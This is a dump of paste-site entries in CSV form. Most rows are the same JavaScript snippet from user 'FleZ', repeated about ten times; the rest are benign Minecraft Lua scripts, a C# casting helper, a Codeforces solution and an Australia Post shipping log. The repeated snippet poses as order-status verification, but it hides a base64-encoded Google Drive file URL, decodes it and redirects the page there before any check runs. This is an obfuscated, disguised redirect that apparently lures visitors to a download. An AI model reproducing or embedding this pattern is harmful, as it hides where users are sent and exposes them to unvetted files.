id,title,username,language,date,content
hSrhemyd,Untitled,FleZ,JavaScript,Sunday 23rd of March 2025 06:10:34 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/219/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
pycJTtTa,Untitled,FleZ,JavaScript,Sunday 23rd of March 2025 05:55:10 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/790/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
0LdzPykn,遥控跳船 信号接收器 原型,jaklsfjlsak,Lua,Sunday 23rd of March 2025 05:46:44 PM CDT,"local ship = peripheral.find(""warpdriveShipController"")

local ship_front, ship_right, ship_up = ship.dim_positive()
local ship_back, ship_left, ship_down = ship.dim_negative()
local ship_isInHyper = ship.isInHyperspace()
local ship_movement = { ship.movement() }
local ship_rotationSteps = ship.rotationSteps()

-- Open rednet on the modem side (adjust ""left"" as needed)
rednet.open(""top"")

print(""Waiting for coordinate broadcasts when redstone is active on the front..."")

while true do
    -- Only process messages when redstone signal on the ""front"" is on.
    if redstone.getInput(""front"") then
        -- Use a timeout (0.5 seconds) so the call doesn't block indefinitely and allows rechecking the redstone state.
        local senderID, message, protocol = rednet.receive(""coordBroadcast"", 0.5)
        
        if senderID then
            if message and message.x and message.y and message.z then
                print(""Received coordinates from computer "" .. senderID .. "":"")
                print(""X: "" .. message.x .. "", Y: "" .. message.y .. "", Z: "" .. message.z)

            local lastLx = tonumber(message.x)
            local lastLy = tonumber(message.y)  -- if needed for future use
            local lastLz = tonumber(message.z)
            
            print(""Jumping to X:"" .. lastLx .. "", Z:"" .. lastLz)
            
            local rx, ry, rz = ship.getOrientation()
            local minForwardBack = math.abs(ship_front + ship_back + 1)
            local minLeftRight = math.abs(ship_left + ship_right + 1)
            local mx, my, mz = ship.getLocalPosition()
            
            local dx = lastLx - mx
            local dz = lastLz - mz
            
            local forwardBackMov = 0
            local leftRightMov = 0
            
            -- Determine movement based on ship's orientation.
            if rx == 1 then
                forwardBackMov = dx
                leftRightMov = dz
            elseif rx == -1 then
                forwardBackMov = -dx
                leftRightMov = -dz
            elseif rz == 1 then
                forwardBackMov = dz
                leftRightMov = -dx
            elseif rz == -1 then
                forwardBackMov = -dz
                leftRightMov = dx
            end
            
            if math.abs(forwardBackMov) < minForwardBack and math.abs(leftRightMov) < minLeftRight then
                print(""The movement is too small!"")
            else
                ship.movement(forwardBackMov, 0, leftRightMov)
                ship.rotationSteps(0)
                ship.command(""MANUAL"", true)
            end

            
            
            else
                print(""Received invalid data from computer "" .. senderID)
            end
        end
    else
        -- Optionally, you can print a message when redstone is off or simply sleep quietly.
        -- print(""Redstone is off on the front; not receiving messages."")
        sleep(0.1)
    end
end
"
nYfB08Ar,Untitled,FleZ,JavaScript,Sunday 23rd of March 2025 05:39:46 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/624/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
FJt5c2Xw,Untitled,FleZ,JavaScript,Sunday 23rd of March 2025 05:24:23 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/611/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
TpjYQkK4,Untitled,lewis_FEUP,Lua,Sunday 23rd of March 2025 05:22:16 PM CDT,"local detector = peripheral.find(""energyDetector"")
local monitor = peripheral.find(""monitor"")
local meBridge = peripheral.find(""meBridge"")

repeat
  monitor.clear()
  monitor.setCursorPos(1, 1)
  monitor.write(""Current transfer rate: "" .. detector.getTransferRate() .. "" FE/t"")
  monitor.setCursorPos(1, 2)
  monitor.write(""Ae2 System:"")
  monitor.setCursorPos(1, 3)
  monitor.write(""Max Energy: "" .. meBridge.getEnergyStorage() * 0.55)
  monitor.setCursorPos(1, 4)
  monitor.write(""Current Energy: "" .. meBridge.getEnergyUsage())
  monitor.setCursorPos(1, 5)
  meItem = meBridge.getItem({name  = ""minecraft:gold_ingot""})
  monitor.setCursorPos(1, 6)
  monitor.write(""Current Energy: "" .. meItem.name .. """")
  monitor.write(""Current Energy: "" .. meItem.displayName  .. """")
  monitor.setCursorPos(1, 7)
  os.sleep(1)
until false
"
w0aDXtdm,Untitled,FleZ,JavaScript,Sunday 23rd of March 2025 05:09:00 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/799/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
UFD0iCEZ,Untitled,FleZ,JavaScript,Sunday 23rd of March 2025 04:53:36 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/474/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
6qKzTXNk,CastHelper,Enderlook,C#,Sunday 23rd of March 2025 04:45:40 PM CDT,"public abstract class CasterHelper<TFrom, TTo>
#if NET9_0_OR_GREATER
    where TFrom : allows ref struct
    where TTo : allows ref struct
#endif
{
#if NET9_0_OR_GREATER
    private static readonly CasterHelper<TFrom, TTo>? Impl = (typeof(TFrom).IsByRefLike || typeof(TTo).IsByRefLike || (typeof(TFrom).IsValueType && typeof(TTo) == typeof(TFrom)))
        ? null
        : (CasterHelper<TFrom, TTo>?)Activator.CreateInstance(typeof(CastHelperImplementation<,>).MakeGenericType(new Type[] { typeof(TFrom), typeof(TTo) }));
#endif

    [MethodImpl(MethodImplOptions.AggressiveInlining)]
    [return: NotNullIfNotNull(nameof(from))]
    public static TTo Cast(scoped in TFrom from)
    {
        if (typeof(TFrom).IsValueType && typeof(TFrom) == typeof(TTo))
        {
#if NET9_0_OR_GREATER
            return Unsafe.BitCast<TFrom, TTo>(from);
#else
            return Unsafe.As<TFrom, TTo>(ref Unsafe.AsRef(in from));
#endif
        }

#if NET9_0_OR_GREATER
        if (typeof(TFrom).IsByRefLike || typeof(TTo).IsByRefLike)
            Helper.ThrowInvalidCastException();
#endif

#if NET9_0_OR_GREATER
        return Impl!.Cast_(from);
#else
        return (TTo)(object)from;
#endif
    }

    [MethodImpl(MethodImplOptions.AggressiveInlining)]
    public static bool TryCast(scoped in TFrom from, out TTo? to)
    {
        if (typeof(TFrom).IsValueType && typeof(TFrom) == typeof(TTo))
        {
#if NET9_0_OR_GREATER
            to = Unsafe.BitCast<TFrom, TTo>(from);
#else
            to = Unsafe.As<TFrom, TTo>(ref Unsafe.AsRef(in from));
#endif
            return true;
        }

#if NET9_0_OR_GREATER
        if (typeof(TFrom).IsByRefLike || typeof(TTo).IsByRefLike)
        {
            to = default;
            return false;
        }
#endif

#if NET9_0_OR_GREATER
        return Impl!.TryCast_(from, out to);
#else
        if (from is TTo v)
        {
            to = v;
            return true;
        }
        to = default;
        return !typeof(TTo).IsValueType && from is null;
#endif
    }

#if NET9_0_OR_GREATER
    [return: NotNullIfNotNull(nameof(from))]
    protected abstract TTo Cast_(scoped in TFrom from);

    protected abstract bool TryCast_(scoped in TFrom from, out TTo to);
#endif
}

#if NET9_0_OR_GREATER
internal sealed class CastHelperImplementation<TFrom, TTo> : CasterHelper<TFrom, TTo>
{
    [MethodImpl(MethodImplOptions.AggressiveInlining)]
    protected override TTo Cast_(scoped in TFrom from) => (TTo)(object)from;

    [MethodImpl(MethodImplOptions.AggressiveInlining)]
    protected override bool TryCast_(scoped in TFrom from, out TTo to)
    {
        if (from is TTo v)
        {
            to = v;
            return true;
        }
        to = default;
        return !typeof(TTo).IsValueType && from is null;
    }
}
#endif"
tyeM1pnM,Untitled,FleZ,JavaScript,Sunday 23rd of March 2025 04:38:03 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/228/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
WLU7KSHH,CF1618E,pb_jiang,C++,Sunday 23rd of March 2025 04:38:02 PM CDT,"// Problem: E. Singers' Tour
// Contest: Codeforces - Codeforces Round 760 (Div. 3)
// URL: https://codeforces.com/problemset/problem/1618/E
// Memory Limit: 256 MB
// Time Limit: 2000 ms
//
// Powered by CP Editor (https://cpeditor.org)

#include <assert.h>
#include <bits/stdc++.h>
using namespace std;
#ifndef __DEBUG__
#define dbg(...) 42
#endif
template <class T> using mpq = priority_queue<T, vector<T>, greater<T>>;

using ll = long long;
using a2l = array<ll, 2>;
using pll = pair<ll, ll>;
using vl = vector<ll>;

void solve()
{
    ll n;
    cin >> n;
    vl bs(n);
    for (auto &x : bs)
        cin >> x;
    vl as(n), cs(n), vs(n);
    for (ll i = 0; i < n; ++i)
        as[i] = bs[i] - bs[(i - 1 + n) % n];
    for (ll i = 0; i < n; ++i)
        cs[i] = as[i] - as[(i - 1 + n) % n];
    for (auto x : cs) {
        if (x % n) {
            dbg(x);
            cout << ""NO\n"";
            return;
        }
    }
    for (ll i = 1; i < n; ++i)
        vs[i] = vs[i - 1] - cs[i] / n;
    ll final = 0, factor = n * (n + 1) / 2;
    for (ll i = 0; i < n; ++i)
        final += ((n - i) % n + 1) * vs[i];
    if ((final - bs[0]) % factor) {
        dbg(final, bs[0], factor);
        cout << ""NO\n"";
        return;
    }
    ll d = (final - bs[0]) / factor;
    for (ll i = 0; i < n; ++i) {
        vs[i] -= d;
        if (vs[i] <= 0) {
            dbg(vs[i]);
            cout << ""NO\n"";
            return;
        }
    }
    cout << ""YES\n"";
    for (auto x : vs)
        cout << x << ' ';
    cout << '\n';
}

int main(int argc, char **argv)
{
    ll t;
    cin >> t;
    while (t--)
        solve();
    return 0;
};
"
tRuB9zkg,Untitled,FleZ,JavaScript,Sunday 23rd of March 2025 04:22:40 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/314/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
B0kgMtc7,Aus Post Paste V2,Evenstephen,JSON,Sunday 23rd of March 2025 04:19:02 PM CDT,"
Packing Details:

Array
(
    [1] => Array
        (
            [weight] => 5.35
            [length] => 66.5
            [height] => 16
            [width] => 29
            [quantity] => 1
            [name] => Box #11
            [postcode] => 3088
        )

)

Packing Request:

https://digitalapi.auspost.com.au/postage/parcel/domestic/calculate.json?from_postcode=3088&to_postcode=3088&length=66.5&width=29&height=16&weight=5.35&service_code=AUS_PARCEL_REGULAR

Australia Post RESPONSE:

stdClass Object
(
    [postage_result] => stdClass Object
        (
            [service] => Parcel Post
            [delivery_time] => Delivered in 2-3 business days
            [total_cost] => 23.45
            [costs] => stdClass Object
                (
                    [cost] => stdClass Object
                        (
                            [item] => Parcel Post
                            [cost] => 23.45
                        )

                )

        )

)

Packing Request:

https://digitalapi.auspost.com.au/postage/parcel/domestic/calculate.json?from_postcode=3088&to_postcode=3088&length=66.5&width=29&height=16&weight=5.35&service_code=AUS_PARCEL_EXPRESS

Australia Post RESPONSE:

stdClass Object
(
    [postage_result] => stdClass Object
        (
            [service] => Express Post
            [delivery_time] => Guaranteed Next Business Day within the Express Post network (If posted on any business day Monday to Friday in accordance with the conditions set out on the item).
            [total_cost] => 32.25
            [costs] => stdClass Object
                (
                    [cost] => stdClass Object
                        (
                            [item] => Express Post
                            [cost] => 32.25
                        )

                )

        )

)

Packing Details:

Array
(
    [1] => Array
        (
            [weight] => 10.7
            [length] => 66.5
            [height] => 29
            [width] => 32
            [quantity] => 2
            [name] => Box #19
            [postcode] => 3088
        )

)

Packing Request:

https://digitalapi.auspost.com.au/postage/parcel/domestic/calculate.json?from_postcode=3088&to_postcode=3088&length=66.5&width=32&height=29&weight=10.7&service_code=AUS_PARCEL_REGULAR

Australia Post RESPONSE:

stdClass Object
(
    [postage_result] => stdClass Object
        (
            [service] => Parcel Post
            [delivery_time] => Delivered in 2-3 business days
            [total_cost] => 25.05
            [costs] => stdClass Object
                (
                    [cost] => stdClass Object
                        (
                            [item] => Parcel Post
                            [cost] => 25.05
                        )

                )

        )

)

Packing Request:

https://digitalapi.auspost.com.au/postage/parcel/domestic/calculate.json?from_postcode=3088&to_postcode=3088&length=66.5&width=32&height=29&weight=10.7&service_code=AUS_PARCEL_EXPRESS

Australia Post RESPONSE:

stdClass Object
(
    [postage_result] => stdClass Object
        (
            [service] => Express Post
            [delivery_time] => Guaranteed Next Business Day within the Express Post network (If posted on any business day Monday to Friday in accordance with the conditions set out on the item).
            [total_cost] => 34.65
            [costs] => stdClass Object
                (
                    [cost] => stdClass Object
                        (
                            [item] => Express Post
                            [cost] => 34.65
                        )

                )

        )

)

Packing Details:

Array
(
    [1] => Array
        (
            [weight] => 15.9
            [length] => 66.5
            [height] => 38
            [width] => 40.5
            [quantity] => 3
            [name] => Box #19
            [postcode] => 3088
        )

)

Packing Request:

https://digitalapi.auspost.com.au/postage/parcel/domestic/calculate.json?from_postcode=3088&to_postcode=3088&length=66.5&width=40.5&height=38&weight=15.9&service_code=AUS_PARCEL_REGULAR

Australia Post RESPONSE:

stdClass Object
(
    [postage_result] => stdClass Object
        (
            [service] => Parcel Post
            [delivery_time] => Delivered in 2-3 business days
            [total_cost] => 27.05
            [costs] => stdClass Object
                (
                    [cost] => stdClass Object
                        (
                            [item] => Parcel Post
                            [cost] => 27.05
                        )

                )

        )

)

Packing Request:

https://digitalapi.auspost.com.au/postage/parcel/domestic/calculate.json?from_postcode=3088&to_postcode=3088&length=66.5&width=40.5&height=38&weight=15.9&service_code=AUS_PARCEL_EXPRESS

Australia Post RESPONSE:

stdClass Object
(
    [postage_result] => stdClass Object
        (
            [service] => Express Post
            [delivery_time] => Guaranteed Next Business Day within the Express Post network (If posted on any business day Monday to Friday in accordance with the conditions set out on the item).
            [total_cost] => 37.65
            [costs] => stdClass Object
                (
                    [cost] => stdClass Object
                        (
                            [item] => Express Post
                            [cost] => 37.65
                        )

                )

        )

)

Have a coupon? Click here to enter your code	
Packing Details:

Array
(
    [1] => Array
        (
            [weight] => 15.9
            [length] => 66.5
            [height] => 38
            [width] => 40.5
            [quantity] => 3
            [name] => Box #19
            [postcode] => 3088
        )

)

Packing Request:

https://digitalapi.auspost.com.au/postage/parcel/domestic/calculate.json?from_postcode=3088&to_postcode=3088&length=66.5&width=40.5&height=38&weight=15.9&service_code=AUS_PARCEL_REGULAR

Australia Post RESPONSE:

stdClass Object
(
    [postage_result] => stdClass Object
        (
            [service] => Parcel Post
            [delivery_time] => Delivered in 2-3 business days
            [total_cost] => 27.05
            [costs] => stdClass Object
                (
                    [cost] => stdClass Object
                        (
                            [item] => Parcel Post
                            [cost] => 27.05
                        )

                )

        )

)

Packing Request:

https://digitalapi.auspost.com.au/postage/parcel/domestic/calculate.json?from_postcode=3088&to_postcode=3088&length=66.5&width=40.5&height=38&weight=15.9&service_code=AUS_PARCEL_EXPRESS

Australia Post RESPONSE:

stdClass Object
(
    [postage_result] => stdClass Object
        (
            [service] => Express Post
            [delivery_time] => Guaranteed Next Business Day within the Express Post network (If posted on any business day Monday to Friday in accordance with the conditions set out on the item).
            [total_cost] => 37.65
            [costs] => stdClass Object
                (
                    [cost] => stdClass Object
                        (
                            [item] => Express Post
                            [cost] => 37.65
                        )

                )

        )

)

Packing Details:

Array
(
    [1] => Array
        (
            [weight] => 15.9
            [length] => 66.5
            [height] => 38
            [width] => 40.5
            [quantity] => 3
            [name] => Box #19
            [postcode] => 3088
        )

)

Packing Request:

https://digitalapi.auspost.com.au/postage/parcel/domestic/calculate.json?from_postcode=3088&to_postcode=3088&length=66.5&width=40.5&height=38&weight=15.9&service_code=AUS_PARCEL_REGULAR

Australia Post RESPONSE:

stdClass Object
(
    [postage_result] => stdClass Object
        (
            [service] => Parcel Post
            [delivery_time] => Delivered in 2-3 business days
            [total_cost] => 27.05
            [costs] => stdClass Object
                (
                    [cost] => stdClass Object
                        (
                            [item] => Parcel Post
                            [cost] => 27.05
                        )

                )

        )

)

Packing Request:

https://digitalapi.auspost.com.au/postage/parcel/domestic/calculate.json?from_postcode=3088&to_postcode=3088&length=66.5&width=40.5&height=38&weight=15.9&service_code=AUS_PARCEL_EXPRESS

Australia Post RESPONSE:

stdClass Object
(
    [postage_result] => stdClass Object
        (
            [service] => Express Post
            [delivery_time] => Guaranteed Next Business Day within the Express Post network (If posted on any business day Monday to Friday in accordance with the conditions set out on the item).
            [total_cost] => 37.65
            [costs] => stdClass Object
                (
                    [cost] => stdClass Object
                        (
                            [item] => Express Post
                            [cost] => 37.65
                        )

                )

        )

)

Packing Details:

Array
(
    [1] => Array
        (
            [weight] => 15.9
            [length] => 66.5
            [height] => 38
            [width] => 40.5
            [quantity] => 3
            [name] => Box #19
            [postcode] => 3088
        )

)

Packing Request:

https://digitalapi.auspost.com.au/postage/parcel/domestic/calculate.json?from_postcode=3088&to_postcode=3088&length=66.5&width=40.5&height=38&weight=15.9&service_code=AUS_PARCEL_REGULAR

Australia Post RESPONSE:

stdClass Object
(
    [postage_result] => stdClass Object
        (
            [service] => Parcel Post
            [delivery_time] => Delivered in 2-3 business days
            [total_cost] => 27.05
            [costs] => stdClass Object
                (
                    [cost] => stdClass Object
                        (
                            [item] => Parcel Post
                            [cost] => 27.05
                        )

                )

        )

)

Packing Request:

https://digitalapi.auspost.com.au/postage/parcel/domestic/calculate.json?from_postcode=3088&to_postcode=3088&length=66.5&width=40.5&height=38&weight=15.9&service_code=AUS_PARCEL_EXPRESS

Australia Post RESPONSE:

stdClass Object
(
    [postage_result] => stdClass Object
        (
            [service] => Express Post
            [delivery_time] => Guaranteed Next Business Day within the Express Post network (If posted on any business day Monday to Friday in accordance with the conditions set out on the item).
            [total_cost] => 37.65
            [costs] => stdClass Object
                (
                    [cost] => stdClass Object
                        (
                            [item] => Express Post
                            [cost] => 37.65
                        )

                )

        )

)

"
5i8KPrVJ,Untitled,FleZ,JavaScript,Sunday 23rd of March 2025 04:07:18 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/465/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
pp78DjFH,Untitled,FleZ,JavaScript,Sunday 23rd of March 2025 03:51:55 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/332/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
